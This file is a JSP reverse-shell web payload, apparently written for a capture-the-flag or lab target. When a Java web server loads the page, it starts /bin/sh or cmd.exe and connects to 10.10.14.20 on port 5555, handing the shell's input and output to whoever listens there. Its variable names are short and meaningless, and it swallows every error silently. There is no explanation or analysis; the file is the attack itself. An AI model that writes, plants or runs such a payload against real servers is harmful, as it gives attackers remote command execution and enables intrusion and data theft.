<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream jc;
    OutputStream qg;

    StreamConnector( InputStream jc, OutputStream qg )
    {
      this.jc = jc;
      this.qg = qg;
    }

    public void run()
    {
      BufferedReader be  = null;
      BufferedWriter cHg = null;
      try
      {
        be  = new BufferedReader( new InputStreamReader( this.jc ) );
        cHg = new BufferedWriter( new OutputStreamWriter( this.qg ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = be.read( buffer, 0, buffer.length ) ) > 0 )
        {
          cHg.write( buffer, 0, length );
          cHg.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( be != null )
          be.close();
        if( cHg != null )
          cHg.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.20", 5555 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
